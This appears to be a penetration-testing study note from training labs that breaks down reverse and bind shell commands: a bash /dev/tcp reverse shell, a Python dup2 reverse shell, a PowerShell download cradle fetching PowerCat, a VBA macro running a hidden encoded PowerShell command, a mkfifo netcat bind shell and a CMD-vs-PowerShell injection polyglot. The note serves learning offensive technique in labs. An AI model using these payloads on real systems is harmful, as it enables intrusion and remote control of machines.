# Shells & Payloads, Command Breakdowns

Part of [[COMMAND BREAKDOWNS]]. Reverse shell delivery mechanics, encoding requirements, and one genuine CMD-vs-PowerShell polyglot. See that page for the entry format.

---

## PetSerAl's CMD-vs-PowerShell detection polyglot

**Full command:**
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

**Piece by piece:** this is a true **polyglot**, one string that means something completely different depending on which interpreter reads it, so only one half of it ever actually runs.
- In **CMD**: `` (dir 2>&1 *`|echo CMD) `` runs `dir` on a path pattern that doesn't exist (the backtick isn't special to CMD, it's just part of a bogus filename), redirects errors to stdout with `2>&1`, and the whole thing is wrapped in parens as a single grouped command. Since the `dir` fails, CMD falls through to the piped `echo CMD`, printing `CMD`. CMD has no concept of the `<# #>` block-comment syntax that follows, so it just... doesn't get that far, the statement already completed.
- In **PowerShell**: the same text parses completely differently. `` `| `` is a backtick-escaped pipe (an escaped character, not a real pipe) inside what PowerShell reads as an expression, so the `dir ... echo CMD` portion becomes something that evaluates without actually printing "CMD" the way CMD would. `&<# rem #>echo PowerShell` is the part that matters: `<# rem #>` is PowerShell's **block comment** syntax, and `&` is PowerShell's call operator. So this segment reads as "call operator, then a comment, then `echo PowerShell`", which prints `PowerShell`.
- The net effect: send the exact same bytes to an unknown injection point, and whichever word comes back (`CMD` or `PowerShell`) tells you which interpreter is actually executing your injected commands, information you need before picking the right reverse shell syntax (CMD and PowerShell reverse shells look nothing alike).

**Where this comes from:** credited in the module to PetSerAl, a well-known contributor to PowerShell-related security tooling/Stack Overflow answers. This specific polyglot shows up in various OSCP-adjacent command injection cheat sheets and CTF writeups searchable as "CMD PowerShell detection polyglot" or "dir echo CMD PowerShell one-liner." Worth treating as a memorized utility one-liner rather than something to derive from scratch under time pressure.

**Where to look in the response:** the app's response body will contain either the literal word `CMD` or the literal word `PowerShell` somewhere in it, nothing else needed, no decoding or filtering required, just read which word came back.

🔁 **Seen in:** [[Common Web Application Attacks#9.4.1. OS Command Injection|Common Web Application Attacks, 9.4.1]], Step 6.

#### Tags: #CommandInjection #Polyglot #CmdVsPowerShell #CommandBreakdowns

---

## Why a bash reverse shell needs `bash -c "..."` wrapping when delivered through PHP

**Full command:**
```bash
bash -c "bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1"
```

**Piece by piece:**
- `bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1` on its own → this is the actual reverse shell. `/dev/tcp/<ip>/<port>` is a special pseudo-device **only `bash` itself understands** (it's a bash builtin feature, not a real file), opening it creates a TCP socket. `>&` redirects both stdout and stderr into that socket, `0>&1` redirects stdin to follow the same fd, together turning the socket into a two-way interactive channel for `bash -i` (interactive bash).
- The outer `bash -c "..."` → this is the non-obvious part, and it exists for a reason that has nothing to do with the reverse shell syntax itself. PHP's `system()` (and similar exec functions) commonly invoke the OS command through `/bin/sh`, not `/bin/bash`, and on most Linux distros `sh` is a symlink to `dash`, a leaner shell that **doesn't implement `/dev/tcp`** at all. Send the raw one-liner without the wrapper and `sh` throws a syntax/file-not-found error, the payload never runs, even though the syntax is perfectly valid bash. Wrapping it in `bash -c "..."` forces a real `bash` process to interpret the inner string regardless of what shell is running the outer command.

**Where this comes from:** this `sh`-vs-`bash` distinction is a general Linux fact (not exploit-specific), documented in bash's own manual under "REDIRECTION" for the `/dev/tcp` feature, and repeatedly called out on PayloadsAllTheThings' and HackTricks' reverse shell cheat sheets as a common reason a "correct-looking" reverse shell one-liner silently fails to fire.

**Where to look in the response:** this one doesn't show up in the HTTP response at all, the shell either connects to your listener or it doesn't. If your `nc -nvlp` listener stays silent after triggering the payload, this wrapping is one of the first things to check (along with whether the payload actually URL-encoded cleanly, see the next entry).

🔁 **Seen in:** [[Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|Common Web Application Attacks, 9.2.1]], Step 6.

#### Tags: #ReverseShell #BashReverseShell #BashCWrapper #CommandBreakdowns

---

## PowerShell `-enc` requires UTF-16LE (Unicode) bytes before base64, not plain ASCII

**Full commands:**
```powershell
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)
```

**Piece by piece:**
- `[System.Text.Encoding]::Unicode.GetBytes($Text)` → despite the generic-sounding name, `.Unicode` in .NET specifically means **UTF-16LE** (2 bytes per character, little-endian), not UTF-8. This is the one detail that makes the whole thing work: `powershell.exe -enc <string>` internally expects its base64 argument to decode back into UTF-16LE bytes, because that's PowerShell's own native internal string representation. Encode as plain ASCII or UTF-8 first and `-enc` will either throw a parse error or silently mangle the script, since the byte layout doesn't match what it's expecting to unpack.
- `[Convert]::ToBase64String($Bytes)` → the actual base64 encode, applied *after* the Unicode conversion, order matters, this has to run on the UTF-16LE byte array, not on the original string directly.
- Why base64 a script at all, rather than delivering it as plain text → the reverse shell script itself is full of characters (`$`, quotes, semicolons, parentheses) that are painful or impossible to smuggle reliably through a `cmd=` URL parameter and a webshell's own command-execution layer. Base64-encoding the whole thing collapses it into one clean alphanumeric-plus-`+/=` string that survives URL encoding and shell-argument parsing without any of those special characters ever appearing literally in the delivery request.

**Where this comes from:** Microsoft's own PowerShell documentation for `powershell.exe`'s command-line switches states `-EncodedCommand` expects a base64-encoded string of UTF-16LE encoded characters, explicitly. RevShells (revshells.com) will produce a correctly Unicode-then-base64-encoded PowerShell payload directly if you'd rather not run this conversion by hand each time.

**Where to look in the response:** nothing to look for in an HTTP response here, this step happens entirely on your attacking machine to *produce* the payload before delivery. The failure mode to watch for is on the target side: if `-enc <string>` throws an error like "the input string cannot be parsed" or does nothing visible, suspect the encoding step (ASCII instead of Unicode) before suspecting the script content itself.

🔁 **Seen in:** [[Common Web Application Attacks#9.3.1. Using Executable Files|Common Web Application Attacks, 9.3.1]], Step 5.

#### Tags: #PowerShellReverseShell #Base64Unicode #CommandBreakdowns

---

## Python `os.dup2()` reverse shell, and why three calls in that specific order

**Full command:**
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_KALI_IP",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Piece by piece:**
- `socket.socket(...)` + `s.connect(...)` → opens a plain outbound TCP connection back to your listener. At this point it's just a network socket, nothing about the shell yet.
- `os.dup2(s.fileno(), 0)`, `os.dup2(s.fileno(), 1)`, `os.dup2(s.fileno(), 2)` → this is the actual mechanism, and the specific numbers matter. File descriptors `0`, `1`, `2` are the OS-level standard **stdin**, **stdout**, **stderr** for the current process. `dup2(src, dst)` makes file descriptor `dst` become a duplicate of `src`, so each call individually redirects one of the three standard streams to point at the socket instead of the terminal. All three calls are needed, redirecting only stdout would get you one-way output with no way to send input back, redirecting only stdin/stdout without stderr means error messages vanish silently instead of coming back over the socket.
- `subprocess.call(["/bin/sh", "-i"])` → launches an interactive shell *after* the redirection is already in place, so the shell inherits the already-redirected file descriptors automatically, everything it reads/writes goes through the socket without the shell process itself knowing anything unusual is happening. The list-of-strings form (`["/bin/sh", "-i"]`) rather than a single string avoids invoking a second intermediate shell just to parse the command, `/bin/sh` is executed directly with `-i` as its literal argument.

**Where this comes from:** this exact one-liner is one of the most widely reused Python reverse shells, present near-verbatim in PayloadsAllTheThings' reverse shell cheat sheet and generated directly by revshells.com under its Python options. Python's own `os` module docs cover `dup2`'s semantics if the file-descriptor mechanics need more depth.

**Where to look in the response:** nothing in an HTTP response, success is your `nc -nvlp` listener receiving a connection and dropping you into a `$` or `#` prompt. If the listener never fires, check that the target actually has a `python`/`python3` binary reachable by that exact name (some targets alias one but not the other) before assuming the payload itself is wrong.

🔁 **Seen in:** [[3. Bashed#3. Upgrade to a Reverse Shell|3. Bashed, "Upgrade to a Reverse Shell"]].

#### Tags: #ReverseShell #Python #Dup2 #CommandBreakdowns

---

## The PowerCat delivery chain: download cradle, `-e powershell`, and why it needs chunking inside a macro

**Full command (the download-and-execute half):**
```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://<kali_ip>/powercat.ps1');powercat -c <kali_ip> -p 4444 -e powershell
```

**Piece by piece:**
- `(New-Object System.Net.WebClient).DownloadString('http://<kali_ip>/powercat.ps1')` → fetches the PowerCat script's raw text over HTTP, as a string, entirely in memory. Nothing touches disk, no file gets written to the target that AV could scan at rest.
- `IEX(...)` → short for `Invoke-Expression`, takes that fetched string and executes it as PowerShell code immediately, in the current session. This two-step "download the text, then `IEX` it" pattern is the standard PowerShell **download cradle**, it's what turns a plain HTTP GET into code actually running on the target. Once this runs, every function PowerCat defines (including the `powercat` command itself) becomes available in the current session.
- `powercat -c <kali_ip> -p 4444 -e powershell` → now that PowerCat's own function is loaded, this line calls it: `-c` (client mode, connect out to the listener) `-p` (port) `-e powershell` (execute `powershell.exe` and pipe its input/output through the connection, PowerCat's equivalent of netcat's `-e`). This is what actually produces the interactive reverse shell, the `IEX` line above only loaded the tool, it didn't call it yet.
- Why PowerCat over a hand-rolled PowerShell reverse-shell one-liner: PowerCat is a maintained, well-tested implementation that handles the socket/stream plumbing correctly, versus hand-writing raw `.NET` socket code (like the `TCPClient`/`NetworkStream` version used elsewhere) every time. Trade-off: it requires two network round trips (fetch the script, then the actual shell callback) instead of one self-contained payload, and it depends on the target being able to reach your web server, not just your listener.

**Why the same payload needs chunking when delivered via a VBA macro, but not via a URL parameter:**
```vba
Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
' ...more chunks...
CreateObject("Wscript.Shell").Run Str
```
- Delivered through a URL parameter (as in [[Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1]]'s command injection case), the base64-encoded payload is just one long string handed to `curl`, no length ceiling that matters in practice.
- Delivered through a **VBA string literal** (as in [[Client-Side Attacks#12.2.3. Leveraging Microsoft Word Macros|12.2.3]]), VBA imposes a hard **255-character limit per string literal**. A base64-encoded reverse shell command easily runs past that. The fix is mechanical concatenation: split the full string into ≤255-char (50 was used here, comfortably under the limit) pieces and rebuild it at runtime with repeated `Str = Str + "<chunk>"` lines, `Str` ends up holding the complete original string once every line has executed, VBA just never has to hold more than one chunk as a literal at a time.
- Generate the split with a script, not by hand: manually counting out 50-character boundaries in a 300+ character base64 blob is exactly the kind of task a single miscounted character silently breaks, with no error until the payload fails to decode on the target. A short Python loop (`for i in range(0, len(s), 50): print(...)`) removes that risk entirely.

**Where this comes from:** PowerCat itself ships in Kali at `/usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1`, its own script header documents the `-c`/`-p`/`-e` flags. The download-cradle pattern (`IEX` + `DownloadString`) is one of the most common PowerShell attack primitives, covered extensively on both HackTricks' and PayloadsAllTheThings' Windows/reverse-shell pages. VBA's 255-character string literal limit is a Visual Basic language fact, not exploit-specific, documented in Microsoft's own VBA language reference.

**Where to look in the response:** nothing in an HTTP response for the cradle itself, watch your Python HTTP server's access log for a `GET /powercat.ps1` (confirms the target actually fetched it, distinguishes "macro didn't fire" from "macro fired but network egress failed") and your `nc -nvlp` listener for the actual shell callback.

🔁 **Seen in:** [[Client-Side Attacks#12.2.3. Leveraging Microsoft Word Macros|Client-Side Attacks, 12.2.3]] (VBA-chunked) and [[Client-Side Attacks#Step 4: Build the `.lnk` shortcut payload (the actual reverse-shell trigger)|Client-Side Attacks, 12.3.1 Step 4]] (unchunked, direct shortcut target).

#### Tags: #PowerCat #DownloadCradle #IEX #VBAStringLimit #MechanicalChunking #CommandBreakdowns

---

---

## mkfifo bind shell: why the named pipe / cat / bash triangle

**Full command:**
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp 4444 > /tmp/f
```

**Piece by piece:**
- `rm /tmp/f` → delete any leftover named pipe from a previous run. `mkfifo` fails if the path already exists.
- `mkfifo /tmp/f` → create a **named pipe** (FIFO) at `/tmp/f`. A named pipe is a special file that connects two processes: one reads from one end, another writes to the other. Unlike a regular file, data written to one end comes out the other immediately with no disk buffering.
- `cat /tmp/f` → reads from the named pipe. Initially blocks, waiting for data. This is the "input side", it delivers the attacker's commands to bash.
- `| /bin/bash -i 2>&1` → pipe the output of cat into an interactive bash shell. Every line cat reads from the fifo becomes a command bash executes. `2>&1` sends bash's stderr into the same pipe as stdout, so error messages reach the attacker.
- `| nc -lvp 4444 > /tmp/f` → nc listens on port 4444. When the attacker connects, nc receives the attacker's typed input. `> /tmp/f` writes that input into the named pipe, which cat is reading from the other end.

**The loop that makes it work:**
Attacker types command → nc receives it → nc writes to `/tmp/f` → cat reads from `/tmp/f` → bash executes the command → bash output goes to nc → nc sends it to the attacker.
The named pipe creates the feedback loop: nc's stdout feeds back into nc's input via bash, completing the two-way shell channel over a single connection.

**Why `nc -e /bin/bash` doesn't always work:**
The traditional `-e` flag (`nc -e /bin/bash -lvp 4444`) spawns a process with nc's stdin/stdout connected directly. But many Linux distributions ship OpenBSD netcat (`nc.openbsd`) which removes the `-e` flag for security reasons. The mkfifo pattern achieves the same result using only POSIX tools, with no `-e` required.

**Where this comes from:** Classic Unix sysadmin pattern for bidirectional piping. Documented in various red team references and `man mkfifo`.

🔁 [[Shells & Payloads#Bind shells|Command Appendix]]

## **Outstanding**
- [ ] CFM webshell tag syntax, JuicyPotato CLSID token impersonation.
